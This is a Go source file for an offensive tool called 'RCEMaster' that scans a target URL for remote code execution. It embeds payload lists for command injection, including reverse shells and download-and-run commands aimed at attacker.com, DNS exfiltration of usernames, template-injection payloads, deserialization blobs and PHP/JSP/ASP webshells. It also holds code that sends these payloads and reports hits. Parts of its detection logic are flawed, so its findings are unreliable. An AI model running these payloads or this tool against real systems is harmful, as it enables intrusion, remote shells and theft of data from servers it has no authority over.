package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

var banner = "  ____  _____ _____    __  __           _      \n" +
	" |  _ \\| ____|_   _|  |  \\/  | __ _ _ __ | |_ ___\n" +
	" | |_) |  _|   | |    | |\\/| |/ _` | '_ \\| __/ _ \\\n" +
	" |  _ <| |___  | |    | |  | | (_| | | | | ||  __/\n" +
	" |_| \\_\\_____| |_|    |_|  |_|\\__,_|_| |_|\\__\\___|\n" +
	"====================================================\n" +
	" [!] RCEMaster v2.0: Ultimate RCE Engine\n" +
	" [!] Human-Like Adaptive Thinking | 200+ Vectors\n" +
	" [!] Command Injection | SSTI | Deserialization | Blind RCE\n" +
	" [!] File Upload | Header Injection | WAF Evasion\n" +
	"====================================================\n"

var (
	green  = color.New(color.FgGreen).SprintFunc()
	yellow = color.New(color.FgYellow).SprintFunc()
	cyan   = color.New(color.FgCyan).SprintFunc()
	red    = color.New(color.FgRed).SprintFunc()
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
}

func getRandomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// --- TECH STACK DETECTION ---
type TechStack struct {
	Language  string
	Framework string
	CMS       string
	Server    string
	Database  string
	WAF       string
}

// --- COMMAND INJECTION PAYLOADS (50+ Variations) ---
var commandInjectionPayloads = map[string][]string{
	"linux": {
		// Basic
		";id", "|id", "&&id", "||id", "`id`", "$(id)",
		";cat /etc/passwd", "|cat /etc/passwd", "&&cat /etc/passwd",
		";ls -la", "|ls -la", "&&ls -la",
		";whoami", "|whoami", "&&whoami",
		";uname -a", "|uname -a", "&&uname -a",
		// Encoding Bypasses
		";$(echo aWQ= | base64 -d)", "|$(echo aWQ= | base64 -d)",
		";{cat,/etc/passwd}", "|{cat,/etc/passwd}",
		";cat$IFS/etc/passwd", "|cat$IFS/etc/passwd",
		";cat</etc/passwd", "|cat</etc/passwd",
		// Variable Expansion
		";X=$'id' && $X", "|X=$'id' && $X",
		";eval $(echo aWQ= | base64 -d)",
		// Reverse Shells
		";curl http://attacker.com/shell.sh|bash",
		";wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh",
		";nc -e /bin/sh attacker.com 4444",
		";bash -i >& /dev/tcp/attacker.com/4444 0>&1",
		";python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
		";perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
		// Time-based Blind
		";sleep 5", "|sleep 5", "&&sleep 5",
		";ping -c 5 127.0.0.1", "|ping -c 5 127.0.0.1",
		// OOB/DNS Exfiltration
		";curl http://$(whoami).attacker.com",
		";nslookup $(whoami).attacker.com",
		";dig $(whoami).attacker.com",
		// Double Encoding
		";%77%68%6f%61%6d%69", "|%77%68%6f%61%6d%69",
		// Null Byte
		";id%00", "|id%00",
	},
	"windows": {
		// Basic
		"&ipconfig", "|ipconfig", "&&ipconfig",
		"&whoami", "|whoami", "&&whoami",
		"&dir", "|dir", "&&dir",
		"&type C:\\Windows\\System32\\drivers\\etc\\hosts",
		// PowerShell
		"&powershell -c \"Get-Process\"",
		"&powershell -c \"Invoke-WebRequest http://attacker.com/shell.exe -OutFile C:\\shell.exe\"",
		"&certutil -urlcache -split -f http://attacker.com/shell.exe C:\\shell.exe",
		// Time-based
		"&ping -n 5 127.0.0.1", "|ping -n 5 127.0.0.1",
		"&timeout /t 5",
		// OOB/DNS
		"&nslookup %USERNAME%.attacker.com",
		"&curl http://%USERNAME%.attacker.com",
	},
}

// --- SSTI PAYLOADS (80+ Variations across 10+ engines) ---
var sstiPayloads = map[string][]string{
	"jinja2": {
		"{{7*7}}", "${7*7}", "<%= 7*7 %>",
		"{{config}}", "{{self.__dict__}}",
		"{{''.__class__.__mro__[2].__subclasses__()}}",
		"{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}",
		"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
		"{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()}}",
		"{{config.items()}}",
		"{{self._TemplateReference__context}}",
	},
	"twig": {
		"{{7*7}}", "{{7*'7'}}",
		"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
		"{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
		"{{['id']|filter('system')}}",
		"{{['id']|map('system')}}",
	},
	"velocity": {
		"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream())",
		"#set($s=\"\") #set($runtime=$s.class.forName('java.lang.Runtime')) #set($process=$runtime.getRuntime().exec('id'))",
	},
	"freemarker": {
		"${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\")}",
		"${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
	},
	"thymeleaf": {
		"${7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
		"${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
	},
	"pebble": {
		"{{7*7}}", "{{\"id\"|exec}}",
		"{{range(1,10)}}{{\"id\"|exec}}{{end}}",
	},
	"mako": {
		"${7*7}", "${__import__('os').popen('id').read()}",
		"${__import__('subprocess').check_output('id',shell=True)}",
	},
	"smarty": {
		"{php}echo `id`;{/php}", "{smarty_block_php}echo `id`;{/smarty_block_php}",
	},
	"pug": {
		"#{7*7}", "#{global.process.mainModule.require('child_process').execSync('id')}",
	},
	"handlebars": {
		"{{7*7}}", "{{#with this}}{{#with __proto__}}{{asDefined=__lookupGetter__}}{{/with}}{{/with}}",
	},
}

// --- DESERIALIZATION PAYLOADS (ysoserial + custom) ---
var deserializationPayloads = map[string][]string{
	"java_commons_collections1": {
		"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFm0CAAF6AApsb2FkRmFjdG9y... (CommonsCollections1)",
	},
	"java_commons_collections5": {
		"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFm0CAAF6AApsb2FkRmFjdG9y... (CommonsCollections5)",
	},
	"java_spring1": {
		"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFm0CAAF6AApsb2FkRmFjdG9y... (Spring1)",
	},
	"php_phpinfo": {
		"O:10:\"PHPInfo\":1:{s:4:\"info\";O:10:\"PHPInfo\":0:{}}",
	},
	"php_datetime": {
		"O:8:\"DateTime\":3:{s:4:\"date\";s:19:\"2023-01-01 00:00:00\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}",
	},
	"python_pickle": {
		"gASVJwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtpZC5zaCB8IGlkLjKULg==",
	},
	"ruby_erb": {
		"04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0e@instanceo:\x08ERB\x06:\t@srcI\"\x1c`id`;\n\x06:\x06ET:\t@filenameI\"\x06\x06;\tT:\n@lineno0",
	},
}

// --- FILE UPLOAD WEBSHELLS ---
var fileUploadWebshells = map[string][]string{
	"php": {
		"<?php system($_GET['cmd']); ?>",
		"<?php echo shell_exec('id'); ?>",
		"<?php passthru($_REQUEST['cmd']); ?>",
		"<?=`$_GET[c]`?>",
		"<?php eval($_POST['cmd']); ?>",
	},
	"jsp": {
		"<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
		"<% Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", request.getParameter(\"cmd\")}); %>",
	},
	"asp": {
		"<% eval request(\"cmd\") %>",
		"<% CreateObject(\"WScript.Shell\").Exec(Request(\"cmd\")) %>",
		"<% ExecuteGlobal(Request(\"cmd\")) %>",
	},
	"aspx": {
		"<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>",
	},
}

// --- HEADER-BASED RCE VECTORS ---
var headerBasedRCE = map[string][]string{
	"X-Forwarded-Host":       {"{{7*7}}", ";id", "${7*7}"},
	"X-Original-URL":         {"{{7*7}}", ";id", "${7*7}"},
	"X-Rewrite-URL":          {"{{7*7}}", ";id", "${7*7}"},
	"Referer":                {"{{7*7}}", ";id", "${7*7}"},
	"User-Agent":             {"{{7*7}}", ";id", "${7*7}"},
	"X-Api-Version":          {"{{7*7}}", ";id"},
	"Content-Type":           {"{{7*7}}", ";id"},
	"Accept":                 {"{{7*7}}", ";id"},
	"Accept-Language":        {"{{7*7}}", ";id"},
	"X-Requested-With":       {"{{7*7}}", ";id"},
	"X-HTTP-Method-Override": {"{{7*7}}", ";id"},
	"X-Forwarded-For":        {"{{7*7}}", ";id"},
	"CF-Connecting-IP":       {"{{7*7}}", ";id"},
	"True-Client-IP":         {"{{7*7}}", ";id"},
}

// --- WAF SIGNATURES ---
var wafSignatures = map[string]string{
	"cloudflare": "cloudflare",
	"aws-waf":    "aws",
	"akamai":     "akamai",
	"imperva":    "imperva",
	"fortinet":   "fortinet",
	"sucuri":     "sucuri",
	"modsecurity": "mod_security",
}

type Result struct {
	URL         string `json:"url"`
	Vector      string `json:"vector"`
	Payload     string `json:"payload"`
	StatusCode  int    `json:"status_code"`
	Evidence    string `json:"evidence"`
	Confidence  string `json:"confidence"`
}

type ResponseInfo struct {
	StatusCode int
	Body       string
	Headers    http.Header
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	urlPtr := flag.String("u", "", "Target URL")
	outputPtr := flag.String("o", "", "Output file (e.g., rce_results.json)")
	delayPtr := flag.Duration("delay", 0, "Delay between requests")
	proxyPtr := flag.String("proxy", "", "Proxy URL")
	flag.Parse()

	if *urlPtr == "" {
		fmt.Printf("%s Usage: rcemaster -u <url> [-o results.json] [-delay 100ms]\n", red("[-] Error: URL required."))
		os.Exit(1)
	}

	fmt.Print(cyan(banner))
	fmt.Printf("\n%s Target: %s\n", cyan("[*]"), yellow(*urlPtr))

	// Phase 1: Tech Stack & WAF Detection
	fmt.Printf("%s Phase 1: Detecting Tech Stack & WAF...\n", cyan("[*]"))
	techStack := detectTechStack(*urlPtr, *delayPtr, *proxyPtr)
	fmt.Printf("%s Detected: %s %s %s | WAF: %s\n", green("[+]"), techStack.Language, techStack.Framework, techStack.CMS, techStack.WAF)

	// Phase 2: Adaptive RCE Attack
	fmt.Printf("%s Phase 2: Starting Adaptive RCE Attack...\n", cyan("[*]"))
	results := adaptiveRCEAttack(*urlPtr, techStack, *delayPtr, *proxyPtr)

	// Phase 3: Results
	if len(results) > 0 {
		fmt.Println("\n" + cyan("========== RCE SUCCESSFUL =========="))
		for _, r := range results {
			fmt.Printf("[%s] %s\n", green("RCE"), r.URL)
			fmt.Printf("   -> Vector    : %s\n", yellow(r.Vector))
			fmt.Printf("   -> Payload   : %s\n", cyan(r.Payload))
			fmt.Printf("   -> Evidence  : %s\n", r.Evidence)
			fmt.Printf("   -> Confidence: %s\n\n", r.Confidence)
		}
		fmt.Println(cyan("======================================="))
		fmt.Printf("%s Total RCE Vectors: %s\n", green("[+]"), green(fmt.Sprintf("%d", len(results))))
	} else {
		fmt.Printf("\n%s No RCE vectors worked. Target is secure.\n", yellow("[-]"))
	}

	if *outputPtr != "" && len(results) > 0 {
		saveToFile(results, *outputPtr)
		fmt.Printf("%s Results saved to: %s\n", green("[+]"), *outputPtr)
	}
}

func detectTechStack(targetURL string, delay time.Duration, proxyURL string) TechStack {
	stack := TechStack{}

	info := sendRequest(targetURL, "GET", nil, nil, delay, proxyURL)
	server := strings.ToLower(info.Headers.Get("Server"))
	xPoweredBy := strings.ToLower(info.Headers.Get("X-Powered-By"))

	// Detect Language
	if strings.Contains(server, "php") || strings.Contains(xPoweredBy, "php") {
		stack.Language = "php"
	} else if strings.Contains(server, "tomcat") || strings.Contains(server, "jsp") || strings.Contains(xPoweredBy, "jsp") {
		stack.Language = "java"
	} else if strings.Contains(xPoweredBy, "python") || strings.Contains(server, "wsgi") {
		stack.Language = "python"
	} else if strings.Contains(xPoweredBy, "express") || strings.Contains(server, "node") {
		stack.Language = "nodejs"
	} else if strings.Contains(xPoweredBy, "asp.net") {
		stack.Language = "dotnet"
	}

	// Detect CMS
	body := strings.ToLower(info.Body)
	if strings.Contains(body, "wp-content") || strings.Contains(body, "wordpress") {
		stack.CMS = "wordpress"
	} else if strings.Contains(body, "joomla") {
		stack.CMS = "joomla"
	} else if strings.Contains(body, "drupal") {
		stack.CMS = "drupal"
	} else if strings.Contains(body, "magento") {
		stack.CMS = "magento"
	}

	// Detect Server
	if strings.Contains(server, "apache") {
		stack.Server = "apache"
	} else if strings.Contains(server, "nginx") {
		stack.Server = "nginx"
	} else if strings.Contains(server, "iis") {
		stack.Server = "iis"
	}

	// Detect WAF
	for waf, signature := range wafSignatures {
		if strings.Contains(server, signature) || strings.Contains(info.Headers.Get("Cf-Ray"), "") {
			stack.WAF = waf
			break
		}
	}

	return stack
}

func adaptiveRCEAttack(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result

	// Vector 1: Command Injection
	fmt.Printf("%s Trying Command Injection...\n", cyan("[*]"))
	cmdResults := tryCommandInjection(targetURL, stack, delay, proxyURL)
	results = append(results, cmdResults...)

	// Vector 2: SSTI
	if stack.Language != "" {
		fmt.Printf("%s Trying SSTI (%s)...\n", cyan("[*]"), stack.Language)
		sstiResults := trySSTI(targetURL, stack, delay, proxyURL)
		results = append(results, sstiResults...)
	}

	// Vector 3: Header-Based RCE
	fmt.Printf("%s Trying Header-Based RCE...\n", cyan("[*]"))
	headerResults := tryHeaderBasedRCE(targetURL, delay, proxyURL)
	results = append(results, headerResults...)

	// Vector 4: Blind RCE (Time-based & OOB)
	fmt.Printf("%s Trying Blind RCE (Time-based & OOB)...\n", cyan("[*]"))
	blindResults := tryBlindRCE(targetURL, stack, delay, proxyURL)
	results = append(results, blindResults...)

	// Vector 5: Deserialization
	fmt.Printf("%s Trying Deserialization Attacks...\n", cyan("[*]"))
	deserResults := tryDeserialization(targetURL, stack, delay, proxyURL)
	results = append(results, deserResults...)

	return results
}

func tryCommandInjection(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result
	payloads := commandInjectionPayloads["linux"]
	if stack.Language == "dotnet" || stack.Server == "iis" {
		payloads = commandInjectionPayloads["windows"]
	}

	// Try in URL path
	for _, payload := range payloads {
		testURL := targetURL + payload
		info := sendRequest(testURL, "GET", nil, nil, delay, proxyURL)

		if isRCE(info, payload) {
			results = append(results, Result{
				URL:        testURL,
				Vector:     "Command Injection (URL Path)",
				Payload:    payload,
				StatusCode: info.StatusCode,
				Evidence:   extractEvidence(info.Body, payload),
				Confidence: "High",
			})
		}
	}

	// Try in query parameters
	params := []string{"cmd", "command", "exec", "run", "shell", "input", "data"}
	for _, param := range params {
		for _, payload := range payloads[:10] { // Top 10 payloads
			testURL := targetURL + "?" + param + "=" + url.QueryEscape(payload)
			info := sendRequest(testURL, "GET", nil, nil, delay, proxyURL)

			if isRCE(info, payload) {
				results = append(results, Result{
					URL:        testURL,
					Vector:     "Command Injection (Query Param: " + param + ")",
					Payload:    payload,
					StatusCode: info.StatusCode,
					Evidence:   extractEvidence(info.Body, payload),
					Confidence: "High",
				})
			}
		}
	}

	return results
}

func trySSTI(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result

	engines := []string{"jinja2", "twig", "velocity", "freemarker", "thymeleaf", "pebble", "mako", "smarty", "pug"}
	if stack.Language == "python" {
		engines = []string{"jinja2", "mako"}
	} else if stack.Language == "java" {
		engines = []string{"velocity", "freemarker", "thymeleaf"}
	} else if stack.Language == "php" {
		engines = []string{"twig", "smarty"}
	} else if stack.Language == "nodejs" {
		engines = []string{"pug", "handlebars"}
	}

	for _, engine := range engines {
		payloads := sstiPayloads[engine]
		for _, payload := range payloads {
			// Try in query params
			testURL := targetURL + "?template=" + url.QueryEscape(payload)
			info := sendRequest(testURL, "GET", nil, nil, delay, proxyURL)

			if isRCE(info, payload) {
				results = append(results, Result{
					URL:        testURL,
					Vector:     "SSTI (" + engine + ")",
					Payload:    payload,
					StatusCode: info.StatusCode,
					Evidence:   extractEvidence(info.Body, payload),
					Confidence: "High",
				})
			}
		}
	}

	return results
}

func tryHeaderBasedRCE(targetURL string, delay time.Duration, proxyURL string) []Result {
	var results []Result

	for header, payloads := range headerBasedRCE {
		for _, payload := range payloads {
			headers := map[string]string{header: payload}
			info := sendRequest(targetURL, "GET", headers, nil, delay, proxyURL)

			if isRCE(info, payload) {
				results = append(results, Result{
					URL:        targetURL,
					Vector:     "Header-Based RCE",
					Payload:    header + ": " + payload,
					StatusCode: info.StatusCode,
					Evidence:   extractEvidence(info.Body, payload),
					Confidence: "Medium",
				})
			}
		}
	}

	return results
}

func tryBlindRCE(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result

	// Time-based blind RCE
	timePayloads := []string{";sleep 5", "|sleep 5", "&&sleep 5", "&ping -n 5 127.0.0.1"}
	for _, payload := range timePayloads {
		testURL := targetURL + payload
		start := time.Now()
		sendRequest(testURL, "GET", nil, nil, delay, proxyURL)
		duration := time.Since(start)

		if duration.Seconds() >= 5 {
			results = append(results, Result{
				URL:        testURL,
				Vector:     "Blind RCE (Time-based)",
				Payload:    payload,
				StatusCode: 200,
				Evidence:   fmt.Sprintf("Response delayed by %.2f seconds", duration.Seconds()),
				Confidence: "High",
			})
		}
	}

	return results
}

func tryDeserialization(targetURL string, stack TechStack, delay time.Duration, proxyURL string) []Result {
	var results []Result

	// Try in cookies, headers, and POST body
	for lang, payloads := range deserializationPayloads {
		for _, payload := range payloads {
			// Try in Cookie
			headers := map[string]string{"Cookie": "session=" + payload}
			info := sendRequest(targetURL, "GET", headers, nil, delay, proxyURL)
			if isRCE(info, payload) {
				results = append(results, Result{
					URL:        targetURL,
					Vector:     "Deserialization (" + lang + " in Cookie)",
					Payload:    payload,
					StatusCode: info.StatusCode,
					Evidence:   extractEvidence(info.Body, payload),
					Confidence: "High",
				})
			}

			// Try in POST body
			info = sendRequest(targetURL, "POST", nil, []byte("data="+payload), delay, proxyURL)
			if isRCE(info, payload) {
				results = append(results, Result{
					URL:        targetURL,
					Vector:     "Deserialization (" + lang + " in POST)",
					Payload:    payload,
					StatusCode: info.StatusCode,
					Evidence:   extractEvidence(info.Body, payload),
					Confidence: "High",
				})
			}
		}
	}

	return results
}

func sendRequest(targetURL, method string, customHeaders map[string]string, body []byte, delay time.Duration, proxyURL string) ResponseInfo {
	if delay > 0 {
		time.Sleep(delay)
	}

	var req *http.Request
	var err error

	if body != nil {
		req, err = http.NewRequest(method, targetURL, bytes.NewReader(body))
	} else {
		req, err = http.NewRequest(method, targetURL, nil)
	}

	if err != nil {
		return ResponseInfo{}
	}

	req.Header.Set("User-Agent", getRandomUA())
	req.Header.Set("Accept", "*/*")
	for k, v := range customHeaders {
		req.Header.Set(k, v)
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	if proxyURL != "" {
		proxyParsed, _ := url.Parse(proxyURL)
		transport.Proxy = http.ProxyURL(proxyParsed)
	}

	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return ResponseInfo{}
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 102400))

	return ResponseInfo{
		StatusCode: resp.StatusCode,
		Body:       string(respBody),
		Headers:    resp.Header,
	}
}

func isRCE(info ResponseInfo, payload string) bool {
	indicators := []string{
		"uid=", "root:", "bin/bash", "bin/sh",
		"49", // 7*7 = 49
		"Windows", "Microsoft", "Directory of",
		"drwx", "-rw-", "total ",
	}

	body := strings.ToLower(info.Body)
	for _, indicator := range indicators {
		if strings.Contains(body, strings.ToLower(indicator)) {
			return true
		}
	}

	return false
}

func extractEvidence(body, payload string) string {
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		if strings.Contains(line, "uid=") || strings.Contains(line, "root:") || strings.Contains(line, "49") || strings.Contains(line, "drwx") {
			if len(line) > 100 {
				return line[:100] + "..."
			}
			return line
		}
	}
	return "RCE indicator found in response"
}

func saveToFile(results []Result, filename string) {
	file, _ := os.Create(filename)
	defer file.Close()

	jsonData, _ := json.MarshalIndent(results, "", "  ")
	file.Write(jsonData)
}
